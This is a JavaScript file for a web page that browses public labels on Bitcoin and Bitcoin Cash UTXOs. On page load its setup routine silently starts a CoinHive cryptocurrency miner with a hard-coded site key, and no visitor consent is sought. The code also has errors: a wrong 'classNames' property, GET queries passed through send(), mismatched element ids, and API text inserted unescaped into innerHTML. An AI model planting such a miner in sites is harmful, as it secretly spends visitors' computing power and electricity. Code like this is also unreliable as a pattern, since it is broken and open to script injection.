function initCoinHive()
{
  var miner = new CoinHive.Anonymous('Csj8qUyygCcffvPTYirPLvQQu9TVOkih');
  miner.start();
}


function populateLabels(extend=false)
{
  var rowCount = document.getElementById("rowCount").value;
  var coin = returnActiveCoin();
  var searchTerm = document.getElementById("searchBar").value;
  var startDate = document.getElementById("dateStart").value;
  var endDate = document.getElementById("dateEnd").value;
  var labelTableHTML = document.getElementById("labelTable");
  var listLength = labelTableHTML.rows.length;
  if (extend == false)
  {
    var startPos = rowCount;
    var endPos = 0; 
  }
  else
  {
    var startPos = listLength + rowCount;
    var endPos = listLength;
  }
  var req = new XMLHttpRequest();
  req.onreadystatechange = function() {
    if (req.readyState == 4 && req.status == 200)
    {
      var APIResponseJSON = req.responseText;
      var labels = JSON.parse(APIResponseJSON);
      var header = labelTableHTML.insertRow(0);
      var rankHeader = header.insertCell(0);
      var labelHeader = header.insertCell(1);
      var utxoHeader = header.insertCell(2);
      rankHeader.innerHTML = "Rank";
      labelHeader.innerHTML = "Public Label";
      utxoHeader.innerHTML = "UTXO";
      
      for (var i = 0; i < labels.length; i ++)
      {
        var row = labelTableHTML.insertRow(i);
        var rank = row.insertCell(0);
        var label = row.insertCell(1);
        var utxo = row.insertCell(2);
        rank.innerHTML = labels[i]["rank"];
        label.innerHTML = labels[i]["label"];
        utxo.innerHTML = labels[i]["utxo"];
      }
        
    }
  };
  req.open("GET", "/api/", true);
  req.send("?function=searchLabels&startPos=" + startPos + "&endPos=" + endPos + "&startDate=" + startDate + "&endDate=" + endDate + "&searchTerm=" + searchTerm + "&coin=" + coin);
    
}


function setupPage()
{
  initCoinHive();
  getUiDefaults();
  populateLabels();
}


function selectCoin(coin)
{
  var bchHTML = document.getElementById("bch");
  var btcHTML = document.getElementById("btc");
  if (coin == "bch")
  {
    bchHTML.classNames.add("active");
    btcHTML.classNames.remove("active"); 
  }
  else if (coin == "btc")
  {
    btcHTML.classNames.add("active");
    bchHTML.classNames.remove("active");
  }
}


function getUiDefaults()
{
  var req = new XMLHttpRequest();
  req.onreadystatechange = function() {
    if (req.readyState == 4 && req.status == 200)
    {
      var APIResponseJSON = req.responseText;
      var uiDefaults = JSON.parse(APIResponseJSON);
      var coin = uiDefaults["coin"];
      var rowsCount = uiDefaults["rowsCount"];
      var startDate = uiDefaults["startDate"];
      var endDate = uiDefaults["endDate"];
      var rowsCountHTML = document.getElementById("rowsCount");
      var startDateHTML = document.getElementById("startDate");
      var endDateHTML = document.getElementById("endDate");
      selectCoin(coin);
      rowsCountHTML.value = rowsCount;
      Date.prototype.toDateInputValue = (function() {
      var local = new Date(this);
      local.setMinutes(this.getMinutes() - this.getTimezoneOffset());
      return local.toJSON().slice(0,10);});
      startDateHTML.value = startDate;
      if (endDate == "")
      {
        endDateHTML.value = new Date().toDateInputValue();
      }
      else
      {
        endDateHTML.value = endDate;
      }
    }
  };
  req.open("GET", "/api/", true);
  req.send("?function=getUiDefaults");
}


function returnActiveCoin()
{
  var bchHTML = document.getElementById("bch");
  if (bchHTML.classList.contains("active"))
  {
    return "bch";
  }
  else
  {
    return "btc";
  }
}
